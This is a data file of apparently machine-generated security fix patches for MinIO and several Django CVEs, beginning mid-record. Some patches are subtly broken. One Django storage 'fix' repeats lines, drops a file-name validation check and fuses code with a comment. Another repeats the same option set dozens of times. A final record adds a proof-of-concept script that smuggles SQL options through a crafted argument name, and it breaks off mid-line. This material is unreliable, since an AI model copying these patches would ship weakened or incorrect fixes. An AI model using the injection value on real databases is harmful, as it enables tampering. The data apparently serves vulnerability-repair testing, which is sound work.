var sp *policy.Policy\n+                                var err error\n+                                if len(svcAcctReq.SessionPolicy) > 0 {\n+                                        sp, err = policy.ParseConfig(bytes.NewReader(svcAcctReq.SessionPolicy))\n+                                        if err != nil {\n+                                                writeErrorResponseJSON(ctx, w, importError(ctx, err, allSvcAcctsFile, user), r.URL)\n+                                                return\n+                                        }\n+                                }\n+                                // service account access key cannot have space characters beginning and end of the string.\n+                                if hasSpaceBE(svcAcctReq.AccessKey) {\n+                                        writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument), r.URL)\n+                                        return\n+                                }\n+                                if !globalIAMSys.IsAllowed(policy.Args{\n+                                        AccountName:     cred.AccessKey,\n+                                        Groups:          cred.Groups,\n+                                        Action:          policy.CreateServiceAccountAdminAction,\n+                                        ConditionValues: getConditionValues(r, \"\", cred),\n+                                        IsOwner:         owner,\n+                                        Claims:          cred.Claims,\n+                                }) {\n+                                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAccessDenied, err, allSvcAcctsFile, user), r.URL)\n+                                        return\n+                                }\n+                                updateReq := true\n+                                _, _, err = globalIAMSys.GetServiceAccount(ctx, svcAcctReq.AccessKey)\n+                                if err != nil {\n+                                        if !errors.Is(err, errNoSuchServiceAccount) {\n+                                                writeErrorResponseJSON(ctx, w, importError(ctx, err, allSvcAcctsFile, user), r.URL)\n+                                                return\n+                                        }\n+                                        updateReq = false\n+                                }\n+                                if updateReq {\n+                                        opts := updateServiceAccountOpts{\n+                                                secretKey:     svcAcctReq.SecretKey,\n+                                                status:        svcAcctReq.Status,\n+                                                name:          svcAcctReq.Name,\n+                                                description:   svcAcctReq.Description,\n+                                                expiration:    svcAcctReq.Expiration,\n+                                                sessionPolicy: sp,\n+                                        }\n+                                        _, err = globalIAMSys.UpdateServiceAccount(ctx, svcAcctReq.AccessKey, opts)\n+                                        if err != nil {\n+                                                writeErrorResponseJSON(ctx, w, importError(ctx, err, allSvcAcctsFile, user), r.URL)\n+                                                return\n+                                        }\n+                                        continue\n+                                }\n+                                opts := newServiceAccountOpts{\n+                                        accessKey:                  user,\n+                                        secretKey:                  svcAcctReq.SecretKey,\n+                                        sessionPolicy:              sp,\n+                                        claims:                     svcAcctReq.Claims,\n+                                        name:                       svcAcctReq.Name,\n+                                        description:                svcAcctReq.Description,\n+                                        expiration:                 svcAcctReq.Expiration,\n+                                        allowSiteReplicatorAccount: false,\n+                                }\n+\n+                                // In case of LDAP we need to resolve the targetUser to a DN and\n+                                // query their groups:\n+                                if globalIAMSys.LDAPConfig.Enabled() {\n+                                        opts.claims[ldapUserN] = svcAcctReq.AccessKey // simple username\n+                                        targetUser, _, err := globalIAMSys.LDAPConfig.LookupUserDN(svcAcctReq.AccessKey)\n+                                        if err != nil {\n+                                                writeErrorResponseJSON(ctx, w, importError(ctx, err, allSvcAcctsFile, user), r.URL)\n+                                                return\n+                                        }\n+                                        opts.claims[ldapUser] = targetUser // username DN\n+                                }\n+\n+                                if _, _, err = globalIAMSys.NewServiceAccount(ctx, svcAcctReq.Parent, svcAcctReq.Groups, opts); err != nil {\n+                                        writeErrorResponseJSON(ctx, w, importError(ctx, err, allSvcAcctsFile, user), r.URL)\n+                                        return\n+                                }\n+\n+                        }\n+                }\n+        }\n+\n+        // import user policy mappings\n+        {\n+                f, err := zr.Open(pathJoin(iamAssetsDir, userPolicyMappingsFile))\n+                switch {\n+                case errors.Is(err, os.ErrNotExist):\n+                case err != nil:\n+                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, userPolicyMappingsFile, \"\"), r.URL)\n+                        return\n+                default:\n+                        defer f.Close()\n+                        var userPolicyMap map[string]MappedPolicy\n+                        data, err := io.ReadAll(f)\n+                        if err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, userPolicyMappingsFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        if err = json.Unmarshal(data, &userPolicyMap); err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, userPolicyMappingsFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        for u, pm := range userPolicyMap {\n+                                // disallow setting policy mapping if user is a temporary user\n+                                ok, _, err := globalIAMSys.IsTempUser(u)\n+                                if err != nil && err != errNoSuchUser {\n+                                        writeErrorResponseJSON(ctx, w, importError(ctx, err, userPolicyMappingsFile, u), r.URL)\n+                                        return\n+                                }\n+                                if ok {\n+                                        writeErrorResponseJSON(ctx, w, importError(ctx, errIAMActionNotAllowed, userPolicyMappingsFile, u), r.URL)\n+                                        return\n+                                }\n+                                if _, err := globalIAMSys.PolicyDBSet(ctx, u, pm.Policies, regUser, false); err != nil {\n+                                        writeErrorResponseJSON(ctx, w, importError(ctx, err, userPolicyMappingsFile, u), r.URL)\n+                                        return\n+                                }\n+                        }\n+                }\n+        }\n+\n+        // import group policy mappings\n+        {\n+                f, err := zr.Open(pathJoin(iamAssetsDir, groupPolicyMappingsFile))\n+                switch {\n+                case errors.Is(err, os.ErrNotExist):\n+                case err != nil:\n+                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, groupPolicyMappingsFile, \"\"), r.URL)\n+                        return\n+                default:\n+                        defer f.Close()\n+                        var grpPolicyMap map[string]MappedPolicy\n+                        data, err := io.ReadAll(f)\n+                        if err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, groupPolicyMappingsFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        if err = json.Unmarshal(data, &grpPolicyMap); err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, groupPolicyMappingsFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        for g, pm := range grpPolicyMap {\n+                                if _, err := globalIAMSys.PolicyDBSet(ctx, g, pm.Policies, unknownIAMUserType, true); err != nil {\n+                                        writeErrorResponseJSON(ctx, w, importError(ctx, err, groupPolicyMappingsFile, g), r.URL)\n+                                        return\n+                                }\n+                        }\n+                }\n+        }\n+\n+        // import sts user policy mappings\n+        {\n+                f, err := zr.Open(pathJoin(iamAssetsDir, stsUserPolicyMappingsFile))\n+                switch {\n+                case errors.Is(err, os.ErrNotExist):\n+                case err != nil:\n+                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, stsUserPolicyMappingsFile, \"\"), r.URL)\n+                        return\n+                default:\n+                        defer f.Close()\n+                        var userPolicyMap map[string]MappedPolicy\n+                        data, err := io.ReadAll(f)\n+                        if err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, stsUserPolicyMappingsFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        if err = json.Unmarshal(data, &userPolicyMap); err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, stsUserPolicyMappingsFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        for u, pm := range userPolicyMap {\n+                                // disallow setting policy mapping if user is a temporary user\n+                                ok, _, err := globalIAMSys.IsTempUser(u)\n+                                if err != nil && err != errNoSuchUser {\n+                                        writeErrorResponseJSON(ctx, w, importError(ctx, err, stsUserPolicyMappingsFile, u), r.URL)\n+                                        return\n+                                }\n+                                if ok {\n+                                        writeErrorResponseJSON(ctx, w, importError(ctx, errIAMActionNotAllowed, stsUserPolicyMappingsFile, u), r.URL)\n+                                        return\n+                                }\n+                                if _, err := globalIAMSys.PolicyDBSet(ctx, u, pm.Policies, stsUser, false); err != nil {\n+                                        writeErrorResponseJSON(ctx, w, importError(ctx, err, stsUserPolicyMappingsFile, u), r.URL)\n+                                        return\n+                                }\n+                        }\n+                }\n+        }\n+\n+        // import sts group policy mappings\n+        {\n+                f, err := zr.Open(pathJoin(iamAssetsDir, stsGroupPolicyMappingsFile))\n+                switch {\n+                case errors.Is(err, os.ErrNotExist):\n+                case err != nil:\n+                        writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, stsGroupPolicyMappingsFile, \"\"), r.URL)\n+                        return\n+                default:\n+                        defer f.Close()\n+                        var grpPolicyMap map[string]MappedPolicy\n+                        data, err := io.ReadAll(f)\n+                        if err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrInvalidRequest, err, stsGroupPolicyMappingsFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        if err = json.Unmarshal(data, &grpPolicyMap); err != nil {\n+                                writeErrorResponseJSON(ctx, w, importErrorWithAPIErr(ctx, ErrAdminConfigBadJSON, err, stsGroupPolicyMappingsFile, \"\"), r.URL)\n+                                return\n+                        }\n+                        for g, pm := range grpPolicyMap {\n+                                if _, err := globalIAMSys.PolicyDBSet(ctx, g, pm.Policies, unknownIAMUserType, true); err != nil {\n+                                        writeErrorResponseJSON(ctx, w, importError(ctx, err, stsGroupPolicyMappingsFile, g), r.URL)\n+                                        return\n+                                }\n+                        }\n+                }\n+        }\n }\n \n func commonAddServiceAccount(r *http.Request) (context.Context, auth.Credentials, newServiceAccountOpts, madmin.AddServiceAccountReq, string, APIError) {\n-\tctx := r.Context()\n-\n-\t// Get current object layer instance.\n-\tobjectAPI := newObjectLayerFn()\n-\tif objectAPI == nil || globalNotificationSys == nil {\n-\t\treturn ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErr(ErrServerNotInitialized)\n-\t}\n-\n-\tcred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n-\tif s3Err != ErrNone {\n-\t\treturn ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErr(s3Err)\n-\t}\n-\n-\tpassword := cred.SecretKey\n-\treqBytes, err := madmin.DecryptData(password, io.LimitReader(r.Body, r.ContentLength))\n-\tif err != nil {\n-\t\treturn ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErrWithErr(ErrAdminConfigBadJSON, err)\n-\t}\n-\n-\tvar createReq madmin.AddServiceAccountReq\n-\tif err = json.Unmarshal(reqBytes, &createReq); err != nil {\n-\t\treturn ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErrWithErr(ErrAdminConfigBadJSON, err)\n-\t}\n-\n-\t// service account access key cannot have space characters beginning and end of the string.\n-\tif hasSpaceBE(createReq.AccessKey) {\n-\t\treturn ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument)\n-\t}\n-\n-\tif err := createReq.Validate(); err != nil {\n-\t\t// Since this validation would happen client side as well, we only send\n-\t\t// a generic error message here.\n-\t\treturn ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument)\n-\t}\n-\t// If the request did not set a TargetUser, the service account is\n-\t// created for the request sender.\n-\ttargetUser := createReq.TargetUser\n-\tif targetUser == \"\" {\n-\t\ttargetUser = cred.AccessKey\n-\t}\n-\n-\tdescription := createReq.Description\n-\tif description == \"\" {\n-\t\tdescription = createReq.Comment\n-\t}\n-\topts := newServiceAccountOpts{\n-\t\taccessKey:   createReq.AccessKey,\n-\t\tsecretKey:   createReq.SecretKey,\n-\t\tname:        createReq.Name,\n-\t\tdescription: description,\n-\t\texpiration:  createReq.Expiration,\n-\t\tclaims:      make(map[string]interface{}),\n-\t}\n-\n-\t// Check if action is allowed if creating access key for another user\n-\t// Check if action is explicitly denied if for self\n-\tif !globalIAMSys.IsAllowed(policy.Args{\n-\t\tAccountName:     cred.AccessKey,\n-\t\tGroups:          cred.Groups,\n-\t\tAction:          policy.CreateServiceAccountAdminAction,\n-\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\tIsOwner:         owner,\n-\t\tClaims:          cred.Claims,\n-\t\tDenyOnly:        (targetUser == cred.AccessKey || targetUser == cred.ParentUser),\n-\t}) {\n-\t\treturn ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErr(ErrAccessDenied)\n-\t}\n-\n-\tvar sp *policy.Policy\n-\tif len(createReq.Policy) > 0 {\n-\t\tsp, err = policy.ParseConfig(bytes.NewReader(createReq.Policy))\n-\t\tif err != nil {\n-\t\t\treturn ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", toAdminAPIErr(ctx, err)\n-\t\t}\n-\t}\n-\n-\topts.sessionPolicy = sp\n-\n-\treturn ctx, cred, opts, createReq, targetUser, APIError{}\n+        ctx := r.Context()\n+\n+        // Get current object layer instance.\n+        objectAPI := newObjectLayerFn()\n+        if objectAPI == nil || globalNotificationSys == nil {\n+                return ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErr(ErrServerNotInitialized)\n+        }\n+\n+        cred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n+        if s3Err != ErrNone {\n+                return ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErr(s3Err)\n+        }\n+\n+        password := cred.SecretKey\n+        reqBytes, err := madmin.DecryptData(password, io.LimitReader(r.Body, r.ContentLength))\n+        if err != nil {\n+                return ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErrWithErr(ErrAdminConfigBadJSON, err)\n+        }\n+\n+        var createReq madmin.AddServiceAccountReq\n+        if err = json.Unmarshal(reqBytes, &createReq); err != nil {\n+                return ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErrWithErr(ErrAdminConfigBadJSON, err)\n+        }\n+\n+        // service account access key cannot have space characters beginning and end of the string.\n+        if hasSpaceBE(createReq.AccessKey) {\n+                return ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument)\n+        }\n+\n+        if err := createReq.Validate(); err != nil {\n+                // Since this validation would happen client side as well, we only send\n+                // a generic error message here.\n+                return ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument)\n+        }\n+        // If the request did not set a TargetUser, the service account is\n+        // created for the request sender.\n+        targetUser := createReq.TargetUser\n+        if targetUser == \"\" {\n+                targetUser = cred.AccessKey\n+        }\n+\n+        description := createReq.Description\n+        if description == \"\" {\n+                description = createReq.Comment\n+        }\n+        opts := newServiceAccountOpts{\n+                accessKey:   createReq.AccessKey,\n+                secretKey:   createReq.SecretKey,\n+                name:        createReq.Name,\n+                description: description,\n+                expiration:  createReq.Expiration,\n+                claims:      make(map[string]interface{}),\n+        }\n+\n+        // Check if action is allowed if creating access key for another user\n+        // Check if action is explicitly denied if for self\n+        if !globalIAMSys.IsAllowed(policy.Args{\n+                AccountName:     cred.AccessKey,\n+                Groups:          cred.Groups,\n+                Action:          policy.CreateServiceAccountAdminAction,\n+                ConditionValues: getConditionValues(r, \"\", cred),\n+                IsOwner:         owner,\n+                Claims:          cred.Claims,\n+                DenyOnly:        (targetUser == cred.AccessKey || targetUser == cred.ParentUser),\n+        }) {\n+                return ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", errorCodes.ToAPIErr(ErrAccessDenied)\n+        }\n+\n+        var sp *policy.Policy\n+        if len(createReq.Policy) > 0 {\n+                sp, err = policy.ParseConfig(bytes.NewReader(createReq.Policy))\n+                if err != nil {\n+                        return ctx, auth.Credentials{}, newServiceAccountOpts{}, madmin.AddServiceAccountReq{}, \"\", toAdminAPIErr(ctx, err)\n+                }\n+        }\n+\n+        opts.sessionPolicy = sp\n+\n+        return ctx, cred, opts, createReq, targetUser, APIError{}\n }\n"}
{"cve":"CVE-2024-39330:0708", "fix_patch": "diff --git a/django/core/files/storage/base.py b/django/core/files/storage/base.py\nindex 16ac22f70a..fa9569579f 100644\n--- a/django/core/files/storage/base.py\n+++ b/django/core/files/storage/base.py\n@@ -31,16 +31,17 @@ class Storage:\n         if name is None:\n             name = content.name\n \n+        name = self.generate_filename(name)\n+\n+        name = self.generate_filename(name)\n+\n+        name = self.generate_filename(name)\n+\n         if not hasattr(content, \"chunks\"):\n             content = File(content, name)\n \n         name = self.get_available_name(name, max_length=max_length)\n-        name = self._save(name, content)\n-        # Ensure that the name returned from the storage system is still valid.\n-        validate_file_name(name, allow_relative_path=True)\n-        return name\n-\n-    # These methods are part of the public API, with default implementations.\n+        return self._save(name, content)    # These methods are part of the public API, with default implementations.\n \n     def get_valid_name(self, name):\n         \"\"\"\n"}
{"cve":"CVE-2021-35042:0708", "fix_patch": "diff --git a/django/db/models/sql/query.py b/django/db/models/sql/query.py\nindex 7a16d4889a..265907b023 100644\n--- a/django/db/models/sql/query.py\n+++ b/django/db/models/sql/query.py\n@@ -1891,21 +1891,13 @@ class Query(BaseExpression):\n         clause. These items are either field names (not column names) --\n         possibly with a direction prefix ('-' or '?') -- or OrderBy\n         expressions.\n-\n         If 'ordering' is empty, clear all ordering from the query.\n         \"\"\"\n         errors = []\n         for item in ordering:\n             if isinstance(item, str):\n-                if '.' in item:\n-                    warnings.warn(\n-                        'Passing column raw column aliases to order_by() is '\n-                        'deprecated. Wrap %r in a RawSQL expression before '\n-                        'passing it to order_by().' % item,\n-                        category=RemovedInDjango40Warning,\n-                        stacklevel=3,\n-                    )\n-                    continue\n+                if '.' in item or ';' in item:\n+                    raise FieldError('Invalid order_by arguments: %s' % (item,))\n                 if item == '?':\n                     continue\n                 if item.startswith('-'):\n"}
{"cve":"CVE-2021-33203:0708", "fix_patch": "diff --git a/django/contrib/admindocs/views.py b/django/contrib/admindocs/views.py\nindex bd566cde40..2e4c84936c 100644\n--- a/django/contrib/admindocs/views.py\n+++ b/django/contrib/admindocs/views.py\n@@ -327,19 +327,21 @@ class TemplateDetailView(BaseAdminDocsView):\n             # Non-trivial TEMPLATES settings aren't supported (#24125).\n             pass\n         else:\n-            # This doesn't account for template loaders (#24128).\n-            for index, directory in enumerate(default_engine.dirs):\n-                template_file = Path(directory) / template\n-                if template_file.exists():\n-                    template_contents = template_file.read_text()\n-                else:\n-                    template_contents = ''\n-                templates.append({\n-                    'file': template_file,\n-                    'exists': template_file.exists(),\n-                    'contents': template_contents,\n-                    'order': index,\n-                })\n+            template_path = Path(template)\n+            if template_path.is_absolute() or '..' in template_path.parts:\n+                kwargs['error'] = _(\n+                    '\u201c%(template)s\u201d is not a valid template.'\n+                ) % {'template': template}\n+            else:\n+                # This doesn't account for template loaders (#24128).\n+                for index, directory in enumerate(default_engine.dirs):\n+                    template_file = Path(directory) / template\n+                    templates.append({\n+                        'file': template_file,\n+                        'exists': template_file.exists(),\n+                        'contents': template_file.read_text() if template_file.exists() else '',\n+                        'order': index,\n+                    })\n         return super().get_context_data(**{\n             **kwargs,\n             'name': template,\n"}
{"cve":"CVE-2022-28347:0708", "fix_patch": "diff --git a/django/db/backends/postgresql/operations.py b/django/db/backends/postgresql/operations.py\nindex 1cb6050bc5..a5f0d7c0b3 100644\n--- a/django/db/backends/postgresql/operations.py\n+++ b/django/db/backends/postgresql/operations.py\n@@ -287,20 +287,243 @@ class DatabaseOperations(BaseDatabaseOperations):\n             return \"(interval '1 day' * (%s - %s))\" % (lhs_sql, rhs_sql), params\n         return super().subtract_temporals(internal_type, lhs, rhs)\n \n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\",\n+        \"VERBOSE\",\n+        \"COSTS\",\n+        \"SETTINGS\",\n+        \"BUFFERS\",\n+        \"WAL\",\n+        \"TIMING\",\n+        \"SUMMARY\",\n+        \"FORMAT\",\n+    }\n+\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+\n+    explain_options = {\n+        \"ANALYZE\",\n+        \"VERBOSE\",\n+        \"COSTS\",\n+        \"SETTINGS\",\n+        \"BUFFERS\",\n+        \"WAL\",\n+        \"TIMING\",\n+        \"SUMMARY\",\n+        \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\",\n+        \"VERBOSE\",\n+        \"COSTS\",\n+        \"SETTINGS\",\n+        \"BUFFERS\",\n+        \"WAL\",\n+        \"TIMING\",\n+        \"SUMMARY\",\n+        \"FORMAT\",\n+    }\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+\n+    explain_options = {\n+        \"ANALYZE\", \"VERBOSE\", \"COSTS\", \"SETTINGS\", \"BUFFERS\", \"WAL\", \"TIMING\",\n+        \"SUMMARY\", \"FORMAT\",\n+    }\n+    explain_options = {\n+        \"ANALYZE\",\n+        \"VERBOSE\",\n+        \"COSTS\",\n+        \"SETTINGS\",\n+        \"BUFFERS\",\n+        \"WAL\",\n+        \"TIMING\",\n+        \"SUMMARY\",\n+        \"FORMAT\",\n+    }\n+    explain_options = {\n+        \"ANALYZE\",\n+        \"VERBOSE\",\n+        \"COSTS\",\n+        \"SETTINGS\",\n+        \"BUFFERS\",\n+        \"WAL\",\n+        \"TIMING\",\n+        \"SUMMARY\",\n+        \"FORMAT\",\n+    }\n+\n     def explain_query_prefix(self, format=None, **options):\n-        prefix = super().explain_query_prefix(format)\n-        extra = {}\n+        prefix = self.explain_prefix\n+        explain_options = {}\n         if format:\n-            extra[\"FORMAT\"] = format\n-        if options:\n-            extra.update(\n-                {\n-                    name.upper(): \"true\" if value else \"false\"\n-                    for name, value in options.items()\n-                }\n-            )\n-        if extra:\n-            prefix += \" (%s)\" % \", \".join(\"%s %s\" % i for i in extra.items())\n+            explain_options[\"format\"] = format\n+        explain_options.update(options)\n+        if explain_options:\n+            options_sql = []\n+            for name, value in explain_options.items():\n+                name = name.upper()\n+                if name not in self.explain_options:\n+                    raise ValueError(f\"Invalid option name: {name!r}\")\n+                if name == \"FORMAT\":\n+                    value = value.upper()\n+                    if value not in self.supported_explain_formats:\n+                        raise ValueError(f\"Invalid format: {value!r}\")\n+                elif isinstance(value, bool):\n+                    value = \"true\" if value else \"false\"\n+                options_sql.append(f\"{name} {value}\")\n+            prefix += f' ({\", \".join(options_sql)})'\n         return prefix\n \n     def ignore_conflicts_suffix_sql(self, ignore_conflicts=None):\ndiff --git a/manage.py b/manage.py\nnew file mode 100644\nindex 0000000000..87ab2e2dbb\n--- /dev/null\n+++ b/manage.py\n@@ -0,0 +1,8 @@\n+#!/usr/bin/env python\n+import os\n+import sys\n+\n+if __name__ == \"__main__\":\n+    os.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"settings\")\n+    from django.core.management import execute_from_command_line\n+    execute_from_command_line(sys.argv)\ndiff --git a/poc.py b/poc.py\nnew file mode 100644\nindex 0000000000..615519c9ef\n--- /dev/null\n+++ b/poc.py\n@@ -0,0 +1,23 @@\n+\n+import os\n+os.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"settings\")\n+import django\n+django.setup()\n+\n+from django.db import connection\n+from django.contrib.auth.models import User\n+\n+if __name__ == \"__main__\":\n+    # Vulnerable call\n+    print(\"Vulnerable call:\")\n+    try:\n+        User.objects.explain(analyze=True, **{\"verbose off, analyze on, 